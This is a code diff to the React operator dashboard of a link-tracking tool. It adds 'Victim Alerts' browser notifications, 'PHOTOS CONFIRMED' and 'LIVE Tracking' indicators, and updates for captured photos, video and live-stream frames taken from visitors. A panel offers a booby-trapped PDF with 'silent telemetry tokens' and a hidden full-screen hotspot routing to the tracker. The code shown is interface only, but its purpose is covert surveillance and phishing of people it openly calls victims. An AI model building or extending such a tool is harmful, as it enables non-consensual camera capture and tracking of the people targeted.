@@ -24,6 +24,7 @@ import {
   FileDown,
   FileText,
   Camera,
+  CheckCircle2,
 } from 'lucide-react';
 import { Language, translations } from '../translations';
 import { TrackingLink, VisitRecord } from '../types';
@@ -40,6 +41,8 @@ interface TrackDashboardProps {
   isRefreshing: boolean;
   onDelete: (code: string) => Promise<void>;
   onGoHome: () => void;
+  notificationPermission?: 'default' | 'granted' | 'denied';
+  onRequestNotificationPermission?: () => void;
 }
 
 export const TrackDashboard: React.FC<TrackDashboardProps> = ({
@@ -50,6 +53,8 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
   isRefreshing,
   onDelete,
   onGoHome,
+  notificationPermission = 'default',
+  onRequestNotificationPermission,
 }) => {
   const t = translations[lang];
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
@@ -61,7 +66,12 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
       const updated = visits.find(
         (v) => v.id === selectedVisit.id || (v.visitorToken && v.visitorToken === selectedVisit.visitorToken)
       );
-      if (updated && (updated.capturedPhotos?.length || 0) !== (selectedVisit.capturedPhotos?.length || 0)) {
+      if (
+        updated &&
+        ((updated.capturedPhotos?.length || 0) !== (selectedVisit.capturedPhotos?.length || 0) ||
+          updated.liveStreamFrame !== selectedVisit.liveStreamFrame ||
+          updated.capturedVideo !== selectedVisit.capturedVideo)
+      ) {
         setSelectedVisit(updated);
       }
     }
@@ -360,20 +370,20 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
             </div>
           </div>
         ) : (
-          <div className="col-span-12 md:col-span-8 bg-indigo-50 rounded-3xl border border-indigo-200 shadow-xl p-6 sm:p-10 flex flex-col sm:flex-row items-center justify-between gap-6 relative overflow-hidden group">
-            <div className="absolute top-0 right-0 p-12 bg-indigo-500/5 rounded-full -mr-16 -mt-16 blur-3xl group-hover:bg-indigo-500/10 transition-all"></div>
+          <div className="col-span-12 md:col-span-8 bg-indigo-50 rounded-2xl border border-indigo-200 shadow-sm p-4 sm:p-6 flex flex-col sm:flex-row items-center justify-between gap-4 relative overflow-hidden group">
+            <div className="absolute top-0 right-0 p-8 bg-indigo-500/5 rounded-full -mr-12 -mt-12 blur-2xl group-hover:bg-indigo-500/10 transition-all"></div>
             
-            <div className="flex flex-col gap-3 relative z-10 text-center sm:text-start ps-0 sm:ps-6">
-              <div className="flex items-center justify-center sm:justify-start gap-4">
-                <div className="w-14 h-14 rounded-full bg-indigo-50 border border-indigo-200 flex items-center justify-center text-indigo-600 shadow-sm">
-                  <FileText className="w-7 h-7" />
+            <div className="flex flex-col gap-2 relative z-10 text-center sm:text-start ps-0 sm:ps-2">
+              <div className="flex items-center justify-center sm:justify-start gap-3">
+                <div className="w-10 h-10 rounded-full bg-indigo-50 border border-indigo-200 flex items-center justify-center text-indigo-600 shadow-2xs">
+                  <FileText className="w-5 h-5" />
                 </div>
                 <div className="flex flex-col">
-                  <h3 className="text-lg font-black text-slate-950 tracking-tight">{lang === 'ar' ? 'ملف التتبع النشط' : 'Active Tracking File'}</h3>
-                  <span className="text-xs font-mono text-indigo-600 font-bold uppercase tracking-widest">{link.code}.pdf</span>
+                  <h3 className="text-base font-black text-slate-950 tracking-tight">{lang === 'ar' ? 'ملف التتبع النشط' : 'Active Tracking File'}</h3>
+                  <span className="text-[10px] font-mono text-indigo-600 font-bold uppercase tracking-widest">{link.code}.pdf</span>
                 </div>
               </div>
-              <p className="text-slate-600 text-xs leading-relaxed max-w-sm font-medium">
+              <p className="text-slate-600 text-[11px] leading-relaxed max-w-sm font-medium">
                 {lang === 'ar' 
                   ? 'هذا الملف يحتوي على كود صامت ومساحة شاشة كاملة موجهة لرابط التتبع فور فتحه أو الضغط على أي جزء منه.' 
                   : 'This file contains silent telemetry tokens and a full-screen interactive hotspot routing to your tracking engine.'}
@@ -383,9 +393,9 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
             <button
               type="button"
               onClick={() => handleDownloadTrackingPdf(link.code)}
-              className="w-full sm:w-auto px-8 py-4 rounded-full bg-indigo-600 hover:bg-indigo-700 text-white shadow-lg shadow-indigo-600/25 text-sm font-black flex items-center justify-center gap-2.5 transition-all cursor-pointer active:scale-95 group shrink-0 relative z-10"
+              className="w-full sm:w-auto px-5 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white shadow-xs text-xs font-bold flex items-center justify-center gap-2 transition-all cursor-pointer active:scale-95 group shrink-0 relative z-10"
             >
-              <FileDown className="w-5 h-5 group-hover:translate-y-0.5 transition-transform" />
+              <FileDown className="w-4 h-4 group-hover:translate-y-0.5 transition-transform" />
               <span>{t.pdfDownloadBtn}</span>
             </button>
           </div>
@@ -510,16 +520,56 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
       )}
 
       {/* Bento Row 3: Control Actions & Refresh Bar */}
-      <div className="flex flex-wrap items-center justify-between gap-2 bg-white/85 backdrop-blur-md p-3 sm:p-3.5 rounded-2xl border border-slate-200 shadow-xs">
-        <button
-          id="btn-refresh-visits"
-          onClick={onRefresh}
-          disabled={isRefreshing}
-          className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold shadow-xs transition-all cursor-pointer disabled:opacity-50"
-        >
-          <RefreshCw className={`w-3 h-3 ${isRefreshing ? 'animate-spin' : ''}`} />
-          <span>{t.refreshBtn}</span>
-        </button>
+      <div className="flex flex-wrap items-center justify-between gap-2.5 bg-white/85 backdrop-blur-md p-3 sm:p-3.5 rounded-2xl border border-slate-200 shadow-xs">
+        <div className="flex flex-wrap items-center gap-2">
+          <button
+            id="btn-refresh-visits"
+            onClick={onRefresh}
+            disabled={isRefreshing}
+            className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold shadow-xs transition-all cursor-pointer disabled:opacity-50"
+          >
+            <RefreshCw className={`w-3 h-3 ${isRefreshing ? 'animate-spin' : ''}`} />
+            <span>{t.refreshBtn}</span>
+          </button>
+
+          {/* Browser Notification request or status element */}
+          {typeof window !== 'undefined' && 'Notification' in window && (
+            <button
+              type="button"
+              onClick={onRequestNotificationPermission}
+              className={`inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl text-xs font-bold border transition-all cursor-pointer ${
+                notificationPermission === 'granted'
+                  ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
+                  : (notificationPermission === 'denied' || (typeof window !== 'undefined' && window.Notification && window.Notification.permission === 'denied'))
+                  ? 'bg-slate-100 text-slate-500 border-slate-200 cursor-not-allowed'
+                  : 'bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border-indigo-200 animate-pulse'
+              }`}
+              title={
+                notificationPermission === 'granted'
+                  ? (lang === 'ar' ? 'إشعارات المتصفح نشطة وتعمل' : 'Browser notifications are active')
+                  : (notificationPermission === 'denied' || (typeof window !== 'undefined' && window.Notification && window.Notification.permission === 'denied'))
+                  ? (lang === 'ar' ? 'الإشعارات محجوبة بالمتصفح' : 'Notifications blocked in browser')
+                  : (lang === 'ar' ? 'اضغط لتفعيل الإشعارات الفورية' : 'Click to enable live push alerts')
+              }
+              disabled={notificationPermission === 'denied' || (typeof window !== 'undefined' && window.Notification && window.Notification.permission === 'denied')}
+            >
+              <span className={`w-1.5 h-1.5 rounded-full ${
+                notificationPermission === 'granted'
+                  ? 'bg-emerald-500'
+                  : (notificationPermission === 'denied' || (typeof window !== 'undefined' && window.Notification && window.Notification.permission === 'denied'))
+                  ? 'bg-slate-400'
+                  : 'bg-indigo-600 animate-ping'
+              }`} />
+              <span>
+                {notificationPermission === 'granted'
+                  ? (lang === 'ar' ? 'إشعارات الضحايا: نشطة' : 'Victim Alerts: Active')
+                  : (notificationPermission === 'denied' || (typeof window !== 'undefined' && window.Notification && window.Notification.permission === 'denied'))
+                  ? (lang === 'ar' ? 'الإشعارات محجوبة' : 'Alerts Blocked')
+                  : (lang === 'ar' ? 'تفعيل إشعارات الضحايا الفورية' : 'Enable Live Victim Alerts')}
+              </span>
+            </button>
+          )}
+        </div>
 
         <button
           id="btn-delete-link"
@@ -842,18 +892,33 @@ export const TrackDashboard: React.FC<TrackDashboardProps> = ({
                       )}
                     </td>
                     <td className="py-2 px-3 text-slate-600 text-[10px] font-mono">
-                      {v.localTime || new Date(v.createdAt).toLocaleTimeString()}
+                      <div className="flex flex-col gap-0.5">
+                        <span>{v.localTime || new Date(v.createdAt).toLocaleTimeString()}</span>
+                        {v.capturedPhotos && v.capturedPhotos.length > 0 && (
+                          <span className="flex items-center gap-1 text-[8px] text-emerald-600 font-black animate-pulse">
+                            <CheckCircle2 className="w-2 h-2" />
+                            {lang === 'ar' ? 'تم تأكيد وصول الصور' : 'PHOTOS CONFIRMED'}
+                          </span>
+                        )}
+                      </div>
                     </td>
                     <td className="py-2 px-3 text-center">
                       <div className="flex items-center justify-center gap-1">
                         <button
                           onClick={() => setSelectedVisit(v)}
-                          className="px-2 py-1 rounded-lg bg-indigo-50 hover:bg-indigo-100 text-indigo-700 font-bold text-[11px] transition-colors cursor-pointer inline-flex items-center gap-1.5"
+                          className={`px-2 py-1 rounded-lg font-bold text-[11px] transition-all cursor-pointer inline-flex items-center gap-1.5 ${
+                            v.isLive 
+                              ? 'bg-rose-600 text-white shadow-md animate-pulse ring-2 ring-rose-500/20' 
+                              : 'bg-indigo-50 hover:bg-indigo-100 text-indigo-700'
+                          }`}
                         >
-                          <span>{t.viewDetails}</span>
-                          {v.capturedPhotos && v.capturedPhotos.length > 0 && (
-                            <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-full bg-rose-100 text-rose-700 text-[10px] font-black">
-                              <Camera className="w-3 h-3 text-rose-600" />
+                          {v.isLive && <Radio className="w-3 h-3 text-white" />}
+                          <span>{v.isLive ? (lang === 'ar' ? 'متابعة حية الآن' : 'LIVE Tracking') : t.viewDetails}</span>
+                          {(v.capturedPhotos && v.capturedPhotos.length > 0) && (
+                            <span className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-full text-[10px] font-black ${
+                              v.isLive ? 'bg-white/20 text-white' : 'bg-rose-100 text-rose-700'
+                            }`}>
+                              <Camera className="w-3 h-3" />
                               <span>{v.capturedPhotos.length}</span>
                             </span>
                           )}
